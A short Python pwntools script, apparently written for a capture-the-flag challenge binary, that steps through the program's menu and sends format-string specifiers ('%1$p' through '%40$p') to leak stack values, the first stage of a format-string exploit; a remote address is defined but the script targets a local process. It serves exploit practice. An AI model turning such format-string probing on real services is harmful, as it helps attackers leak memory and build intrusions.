from pwn import *

context.log_level = 'debug'

def detect(io):
	for i in range(40):
		svar = '%'+str(i+1)+'$p'
		io.recvuntil('2. Space food')
		io.sendline(b'1')
		io.recvuntil('3. Deathstar(70.00 s.rocks)')
		io.sendline(b'2')
		io.recvuntil('Red or Green Kryptonite?')
		io.sendline(svar.encode())
		if i+1 >= 9:
			io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
			io.sendline(b'n')

ip, port = '142.93.34.45', 30123
#io = remote(ip, port)
io = process('./what_does_the_f_say')

detect(io)
